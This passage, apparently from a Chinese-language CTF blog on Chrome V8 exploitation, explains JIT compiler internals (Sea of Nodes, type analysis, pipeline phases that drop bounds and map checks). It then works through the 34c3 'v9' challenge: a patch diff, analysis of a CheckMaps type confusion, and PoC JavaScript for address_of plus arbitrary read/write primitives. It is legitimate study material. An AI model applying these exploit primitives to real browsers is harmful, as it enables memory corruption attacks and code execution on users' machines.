<p><code>arbitrary_offset_read</code> 和 <code>arbitrary_offset_write</code> 原语实现：直接通过 <code>apray_array</code> 修改 <code>elements</code> 然后读写 <code>fake_double_array</code> 实现。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/40d6aadbb91cf5e7bab20fb3feaa8493.png"
                      alt="在这里插入图片描述" style="zoom: 33%;" 
                ></p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_offset_read</span>(<span class="params">address</span>) &#123;</span><br><span class="line">    spray_array[(fake_double_array_offset - spray_array_data_offset) / <span class="number">8n</span> + <span class="number">1n</span>] = <span class="title function_">u2d</span>((address - <span class="number">8n</span>) | <span class="number">1n</span> | (<span class="number">0x00000002n</span> &lt;&lt; <span class="number">32n</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(fake_double_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_offset_write</span>(<span class="params">address, value</span>) &#123;</span><br><span class="line">    spray_array[(fake_double_array_offset - spray_array_data_offset) / <span class="number">8n</span> + <span class="number">1n</span>] = <span class="title function_">u2d</span>((address - <span class="number">8n</span>) | <span class="number">1n</span> | (<span class="number">0x00000002n</span> &lt;&lt; <span class="number">32n</span>));</span><br><span class="line">    fake_double_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(value);</span><br></pre></td></tr></table></figure></div>
<h1 id="JustinTimeCompiler"><a href="#JustinTimeCompiler" class="headerlink" title="JustinTimeCompiler"></a>JustinTimeCompiler</h1><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/4109726cb43700ba2053f1562ad5328f.png"
                      alt="在这里插入图片描述"
                ></p>
<h2 id="预测优化"><a href="#预测优化" class="headerlink" title="预测优化"></a>预测优化</h2><p>Javascript是弱类型，函数参数的类型无法再翻译时确定，但是每一个函数调用，传进来的实参都有一个确定的类型，因此这个信息收集起来用来优化函数。</p>
<ul>
<li>Feedback Vector，收集参数类型<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/50fae3d29f2265768819de558d98ceff.png"
                      alt="在这里插入图片描述"
                ></li>
<li>Feedback 的变化遵循格的规律，不可逆。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/0415a8c76d1fc0c8b4211f2204eaa08f.png"
                      alt="在这里插入图片描述"
                ></li>
</ul>
<h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/e0a3f6080bea3dacd16e6600bcc983e6.png"
                      alt="在这里插入图片描述"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/44b4d0ced5a0cb04a1d1e7fe92cf71e7.png"
                      alt="在这里插入图片描述"
                ></p>
<h2 id="Sea-of-Nodes"><a href="#Sea-of-Nodes" class="headerlink" title="Sea of Nodes"></a>Sea of Nodes</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><h4 id="SSA-static-single-assignment"><a href="#SSA-static-single-assignment" class="headerlink" title="SSA(static single assignment)"></a>SSA(static single assignment)</h4><p>这个是 IR 的一个属性。如果一套 IR 里面，规定了所有的变量一定被且只被赋值一次，且所有的变量在使用之前都保证被定义</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">0</span>;</span><br><span class="line">a = (a + <span class="number">2</span>) * <span class="number">3</span>;</span><br><span class="line">b = a + <span class="number">2</span>;</span><br></pre></td></tr></table></figure></div>

<p>普通的 IR</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v_a = 0</span><br><span class="line">v_a = v_a + 2</span><br><span class="line">v_a = v_a * 3</span><br><span class="line">v_b = v_a + 2</span><br></pre></td></tr></table></figure></div>

<p>SSA 的 IR</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v_a0 = 0</span><br><span class="line">v_a1 = v_a0 + 2</span><br><span class="line">v_a2 = v_a1 * 3</span><br><span class="line">v_b = v_a2 + 2</span><br></pre></td></tr></table></figure></div>

<h4 id="CFG-Control-Flow-Graph"><a href="#CFG-Control-Flow-Graph" class="headerlink" title="CFG(Control Flow Graph)"></a>CFG(Control Flow Graph)</h4><p>控制流图是一个有向图，它的每一个结点由一个或多个指令转成。结点保证了只有在最后一条指令才能发生跳转，其他在结点里的所有指令都不会发生跳转。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/876aa00ca9fbf797dad74af35ee24c47.png"
                      alt="在这里插入图片描述"
                ></p>
<h4 id="DFG-Data-Flow-Graph"><a href="#DFG-Data-Flow-Graph" class="headerlink" title="DFG(Data Flow Graph)"></a>DFG(Data Flow Graph)</h4><p>数据流图则刻画了操作之前的数据依赖关系。图里的每一个结点都表示了一个操作，如果一个操作结点的结果被其他操作结点所使用，那么它们在数据流图里就会存在一条边。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/a6c3f2f1bcd8d4741db4e01aaf336aa3.png"
                      alt="在这里插入图片描述"
                ></p>
<h3 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h3><p>CFG 和 DFG 从不同的层面刻画了程序。它们有交集的地方。控制流中还有一定的数据流，数据流中含有一定的控制流。直接去操纵这两者进行优化，问题会变得复杂且容易出错。<br>在 JIT 中依赖有数据依赖、Effect依赖和控制依赖 3 种。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/6cd57cf7655930c41f71d454875b90e6.png"
                      alt="在这里插入图片描述"
                ></p>
<h4 id="数据依赖"><a href="#数据依赖" class="headerlink" title="数据依赖"></a>数据依赖</h4><p>所有的计算操作都被刻画成图的结点<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/a7757ad400f4a4f570691d1c4507ee2d.png"
                      alt="在这里插入图片描述"
                ><br>没有控制流图那种严格的执行顺序，而是根据依赖关系，符合拓扑排序的所有顺序都是满足条件<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/63d6cecd17d990543b6e936e991dfa82.png"
                      alt="在这里插入图片描述"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/42918fead32d25fc816fe0a7dba91c41.png"
                      alt="在这里插入图片描述"
                ></p>
<h4 id="Effect依赖"><a href="#Effect依赖" class="headerlink" title="Effect依赖"></a>Effect依赖</h4><p>保证图中数据的读写顺序和源程序是一致的<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/fb87e78bdb0c9fe9693a237b34a8d109.png"
                      alt="在这里插入图片描述"
                ></p>
<h4 id="控制依赖"><a href="#控制依赖" class="headerlink" title="控制依赖"></a>控制依赖</h4><p>规定了程序执行的顺序，但是比常规的 CFG 要宽松。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/264e73ea57d5d707a1013a5891774fbe.png"
                      alt="在这里插入图片描述"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/0c6724735e2c145b240a8da0aa242215.png"
                      alt="在这里插入图片描述"
                ></p>
<h3 id="操作符的特例化"><a href="#操作符的特例化" class="headerlink" title="操作符的特例化"></a>操作符的特例化</h3><p>在 Sea of nodes 里面，操作符有三种级别，分别是 <code>Javascript</code> ，<code>Intermediate</code> ，以及 <code>mahine</code> 。从上往下分别是从抽象到具体，越往下就表示越优化。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/139e319af448a78ffa14f66d3bf7c35c.png"
                      alt="在这里插入图片描述"
                ></p>
<h2 id="JIT常见优化"><a href="#JIT常见优化" class="headerlink" title="JIT常见优化"></a>JIT常见优化</h2><h3 id="Type-and-Range-Analysis"><a href="#Type-and-Range-Analysis" class="headerlink" title="Type and Range Analysis"></a>Type and Range Analysis</h3><p>对数据的类型和范围进行分析能促进很多优化，比如bound check的去除。当操作数为两个带有 type 和 range 的结点，输出结果也往往带着 type 和 range ，且 range 是根据两个操作数的 range 和操作符进行结合。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/8cdcf2b6aa25a7360804883f46ff5a74.png"
                      alt="在这里插入图片描述"
                ></p>
<h3 id="规约-Reduction"><a href="#规约-Reduction" class="headerlink" title="规约(Reduction)"></a>规约(Reduction)</h3><h4 id="常量折叠-constant-folding"><a href="#常量折叠-constant-folding" class="headerlink" title="常量折叠(constant folding)"></a>常量折叠(constant folding)</h4><p>常量折叠就是当编译器判断出一个操作的结果恒为常量时，他就会把这个操作直接用其结果进行替代。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/edbbe9d55493f65dce33639849194ccd.png"
                      alt="在这里插入图片描述"
                ></p>
<h4 id="强度折减（strength-reduction）"><a href="#强度折减（strength-reduction）" class="headerlink" title="强度折减（strength reduction）"></a>强度折减（strength reduction）</h4><p>强度折减将昂贵的运算以相同但是相对便宜的运算取代。比如用加法替代乘法，用左右移替代乘除法。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/b1b65b804708e255d79d0fce82703146.png"
                      alt="在这里插入图片描述"
                ></p>
<h4 id="Typed-Lowering"><a href="#Typed-Lowering" class="headerlink" title="Typed Lowering"></a>Typed Lowering</h4><p>Typed Lowering利用运行信息如变量类型将操作具体化，减少抽象度。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/c4bc8455ef385bb57ce005db778d5460.png"
                      alt="在这里插入图片描述"
                ></p>
<h4 id="Global-Value-Numbering"><a href="#Global-Value-Numbering" class="headerlink" title="Global Value Numbering"></a>Global Value Numbering</h4><p>本质上就是尽可能多的进行等价替代，减少重复计算。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/d31d2de344434bb35e75c755d809fb90.png"
                      alt="在这里插入图片描述"
                ></p>
<h4 id="控制优化"><a href="#控制优化" class="headerlink" title="控制优化"></a>控制优化</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/c0dc4e73512fc049511b2f31a3812b85.png"
                      alt="在这里插入图片描述"
                ></p>
<h3 id="Inline"><a href="#Inline" class="headerlink" title="Inline"></a>Inline</h3><p>inline 是把一些函数调用直接替换成函数执行体。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/0b2bc6bda174951f0a1a0a389cb41531.png"
                      alt="在这里插入图片描述"
                ></p>
<h3 id="Escape-Analysis"><a href="#Escape-Analysis" class="headerlink" title="Escape Analysis"></a>Escape Analysis</h3><p>决定一个对象的作用域是否被限制在当前的函数中。在 v8 中，它能减少在堆中分配对象的次数。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/be15d33251e5c3e49569356c634286a3.png"
                      alt="在这里插入图片描述"
                ></p>
<h2 id="V8流水线"><a href="#V8流水线" class="headerlink" title="V8流水线"></a>V8流水线</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/3a9c0cb83fc7cfe44978281c40fcacb0.png"
                      alt="在这里插入图片描述"
                ><br>具体看 <code>v8/src/compiler/pipeline.cc</code></p>
<ul>
<li>bytecode graph builder (GraphBuilderPhase)<ul>
<li>建图，js 代码生成 sea of nodes</li>
</ul>
</li>
<li>inlining<ul>
<li>删除不会执行的代码</li>
<li>函数内联，例如把 <code>JSCall</code>(<code>MathExpm1</code>) 替换为 <code>NumberExpm1</code></li>
<li>删除死节点到活节点的边</li>
</ul>
</li>
<li>Typer<ul>
<li>将每个节点打上标签，例如数据范围和数据类型，并且计算的数据范围在接下来的所有阶段中都不会改变，也就是说接下里所有阶段的数据范围都继承自 typer 阶段</li>
</ul>
</li>
<li>typered lowering<ul>
<li>删除不会执行的代码。</li>
<li>常量折叠，例如 <code>1 + 1</code> 替换为 <code>2</code>。</li>
<li>类型优化，例如根据传入的一个参数始终为 <code>-1</code> 将 <code>SameValue</code> 替换为 <code>ObjectIsMinusZero</code>。</li>
<li>根据 typer 阶段的预测值，预测 samevalue 的返回值，如果一定返回 true 或者 false ，就把 samevalue 替换成 true 或者 false 。</li>
</ul>
</li>
<li>loop peeling<br>貌似没啥用，所以导致 typered lowering 和 load elimination 阶段效果相似。</li>
<li>load elimination<br>包含 RedundancyElimination ，根据 typer 阶段的预测值，预测 samevalue 的返回值，如果一定返回 true 或者 false，就把 samevalue 替换成 true 或者 false 。如果被优化的函数中，定义了全局的 array（前面不加 var 和 let），则根据定义的 array 中元素个数，把 checkbound 节点（checkbound 节点来源于对 array 的读写操作）的第二个输入从 loadfield 替换成“ array 中元素个数”这个常量。一般我们想要越界读写 array 都要去掉 checkbound 节点，触发“ simplified lowering 阶段去掉 checkbound 节点”优化前需要先触发“ load elimination 阶段”的这个优化。另外触发的函数的越界数组必须定义在函数内部，不能是全局的，否则 v8 无法确定数组中的元素个数。</li>
<li>escape analysis<br>把属性的值从对象中取出来。<code>LoadField</code> 从 <code>JSObject</code> 获取属性，如果获取的属性值确定，就把LoadField 替换成属性值。根据目前遇到的题目来看，escape analysis 对于不能 inline 的库函数的返回结果和另一个对象的属性进行比较之类的操作的时候会在这个阶段将属性的值从对象中取出来，否则如果有优化空间会在前一步的 load elimination 阶段将属性的值从对象中取出来同时根据预测的结果优化为常量。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/be15d33251e5c3e49569356c634286a3.png"
                      alt="在这里插入图片描述"
                ></li>
<li>simplified lowering<br>尝试对 samevalue 进行降级，因此会参考 samevalue 的两个输入预测 samevalue 的返回值，并影响后续节点的预测（但是range都没有改变）。并不会把 samevalue 替换成 true 或者 false 。根据访问范围是否始终在 Array 内决定是否去掉 CheckBounds 。</li>
</ul>
<h2 id="例题：34c3-v9"><a href="#例题：34c3-v9" class="headerlink" title="例题：34c3 v9"></a>例题：34c3 v9</h2><p><a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/v8_pwn/34c3_v9" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mkdir v8 &amp;&amp; cd v8</span><br><span class="line">fetch v8 &amp;&amp; cd v8</span><br><span class="line">git checkout 7.6.303.28</span><br><span class="line">gclient sync</span><br><span class="line">git clone https://github.com/saelo/v9.git</span><br><span class="line">patch -p1 &lt; v9/v9_7.2.patch</span><br><span class="line">./tools/dev/gm.py x64.release</span><br></pre></td></tr></table></figure></div>

<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/compiler/redundancy-elimination.cc b/src/compiler/redundancy-elimination.cc</span><br><span class="line">index b91b82e766..02c1e71203 100644</span><br><span class="line">--- a/src/compiler/redundancy-elimination.cc</span><br><span class="line">+++ b/src/compiler/redundancy-elimination.cc</span><br><span class="line">@@ -26,6 +26,7 @@ Reduction RedundancyElimination::Reduce(Node* node) &#123;</span><br><span class="line">     case IrOpcode::kCheckHeapObject:</span><br><span class="line">     case IrOpcode::kCheckIf:</span><br><span class="line">     case IrOpcode::kCheckInternalizedString:</span><br><span class="line">+    case IrOpcode::kCheckMaps:</span><br><span class="line">     case IrOpcode::kCheckNotTaggedHole:</span><br><span class="line">     case IrOpcode::kCheckNumber:</span><br><span class="line">     case IrOpcode::kCheckReceiver:</span><br><span class="line">@@ -158,8 +159,8 @@ bool CheckSubsumes(Node const* a, Node const* b) &#123;</span><br><span class="line">         case IrOpcode::kCheckedUint32ToInt32:</span><br><span class="line">         case IrOpcode::kCheckedUint32ToTaggedSigned:</span><br><span class="line">         case IrOpcode::kCheckedUint64Bounds:</span><br><span class="line">-        case IrOpcode::kCheckedUint64ToInt32:</span><br><span class="line">         case IrOpcode::kCheckedUint64ToTaggedSigned:</span><br><span class="line">+        case IrOpcode::kCheckedUint64ToInt32:</span><br><span class="line">           break;</span><br><span class="line">         case IrOpcode::kCheckedFloat64ToInt32:</span><br><span class="line">         case IrOpcode::kCheckedFloat64ToInt64:</span><br><span class="line">@@ -188,6 +189,15 @@ bool CheckSubsumes(Node const* a, Node const* b) &#123;</span><br><span class="line">           &#125;</span><br><span class="line">           break;</span><br><span class="line">         &#125;</span><br><span class="line">+        case IrOpcode::kCheckMaps: &#123;</span><br><span class="line">+            // CheckMaps are compatible if the first checks a subset of the second.</span><br><span class="line">+            ZoneHandleSet&lt;Map&gt; const&amp; a_maps = CheckMapsParametersOf(a-&gt;op()).maps();</span><br><span class="line">+            ZoneHandleSet&lt;Map&gt; const&amp; b_maps = CheckMapsParametersOf(b-&gt;op()).maps();</span><br><span class="line">+            if (!b_maps.contains(a_maps)) &#123;</span><br><span class="line">+                return false;</span><br><span class="line">+            &#125;</span><br><span class="line">+            break;</span><br><span class="line">+        &#125;</span><br><span class="line">         default:</span><br><span class="line">           DCHECK(!IsCheckedWithFeedback(a-&gt;op()));</span><br><span class="line">           return false;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>分析 diff 文件，发现增加了 <code>kCheckMaps</code> 的 reduce 优化，这个优化的作用是合并两个 <code>kCheckMaps</code> 操作，而合并的条件是前一个 <code>kCheckMaps</code> 的判断条件包含了后一个 <code>kCheckMaps</code> 的全部判断条件。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">CheckSubsumes</span><span class="params">(Node <span class="type">const</span>* a, Node <span class="type">const</span>* b)</span> </span>&#123;</span><br><span class="line">      ...</span><br><span class="line">      <span class="keyword">switch</span> (a-&gt;<span class="built_in">opcode</span>()) &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">case</span> IrOpcode::kCheckMaps: &#123;</span><br><span class="line">            <span class="comment">// CheckMaps are compatible if the first checks a subset of the second.</span></span><br><span class="line">            ZoneHandleSet&lt;Map&gt; <span class="type">const</span>&amp; a_maps = <span class="built_in">CheckMapsParametersOf</span>(a-&gt;<span class="built_in">op</span>()).<span class="built_in">maps</span>();</span><br><span class="line">            ZoneHandleSet&lt;Map&gt; <span class="type">const</span>&amp; b_maps = <span class="built_in">CheckMapsParametersOf</span>(b-&gt;<span class="built_in">op</span>()).<span class="built_in">maps</span>();</span><br><span class="line">            <span class="keyword">if</span> (!b_maps.<span class="built_in">contains</span>(a_maps)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Node* RedundancyElimination::EffectPathChecks::<span class="built_in">LookupCheck</span>(Node* node) <span class="type">const</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (Check <span class="type">const</span>* check = head_; check != <span class="literal">nullptr</span>; check = check-&gt;next) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">CheckSubsumes</span>(check-&gt;node, node) &amp;&amp; <span class="built_in">TypeSubsumes</span>(node, check-&gt;node)) &#123;</span><br><span class="line">      <span class="built_in">DCHECK</span>(!check-&gt;node-&gt;<span class="built_in">IsDead</span>());</span><br><span class="line">      <span class="keyword">return</span> check-&gt;node;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Reduction <span class="title">RedundancyElimination::ReduceCheckNode</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">  Node* <span class="type">const</span> effect = NodeProperties::<span class="built_in">GetEffectInput</span>(node);</span><br><span class="line">  EffectPathChecks <span class="type">const</span>* checks = node_checks_.<span class="built_in">Get</span>(effect);</span><br><span class="line">  <span class="comment">// If we do not know anything about the predecessor, do not propagate just yet</span></span><br><span class="line">  <span class="comment">// because we will have to recompute anyway once we compute the predecessor.</span></span><br><span class="line">  <span class="keyword">if</span> (checks == <span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="built_in">NoChange</span>();</span><br><span class="line">  <span class="comment">// See if we have another check that dominates us.</span></span><br><span class="line">  <span class="keyword">if</span> (Node* check = checks-&gt;<span class="built_in">LookupCheck</span>(node)) &#123;</span><br><span class="line">    <span class="built_in">ReplaceWithValue</span>(node, check);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Replace</span>(check);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Learn from this check.</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">UpdateChecks</span>(node, checks-&gt;<span class="built_in">AddCheck</span>(<span class="built_in">zone</span>(), node));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Reduction <span class="title">RedundancyElimination::Reduce</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (node_checks_.<span class="built_in">Get</span>(node)) <span class="keyword">return</span> <span class="built_in">NoChange</span>();</span><br><span class="line">  <span class="keyword">switch</span> (node-&gt;<span class="built_in">opcode</span>()) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">case</span> IrOpcode::kCheckMaps:</span><br><span class="line">    ...</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">ReduceCheckNode</span>(node);</span><br></pre></td></tr></table></figure></div>
<p>因此如果两次 <code>kCheckMaps</code> 之间如果一直没有修改 <code>map</code> 那么经过 JIT 优化后后一个 <code>kCheckMaps</code> 会被去除，而此时如果修改了 <code>map</code> 则由于缺少对 <code>map</code> 的检查导致类型混淆。<br>poc 如下：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">address_of</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> a = [<span class="number">.1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params">callback</span>) &#123;</span><br><span class="line">        <span class="comment">// Generate first MapCheck</span></span><br><span class="line">        a[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">// This callback could change the Map ...</span></span><br><span class="line">        <span class="title function_">callback</span>();</span><br><span class="line">        <span class="comment">// ... but this MapCheck will still be removed ¯\_(ツ)_/¯</span></span><br><span class="line">        <span class="keyword">return</span> a[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">evil_callback</span>(<span class="params"></span>) &#123;</span><br><span class="line">        a[<span class="number">0</span>] = obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        <span class="title function_">trigger</span>(<span class="function">() =&gt;</span> &#123; &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(<span class="title function_">trigger</span>(evil_callback));</span><br><span 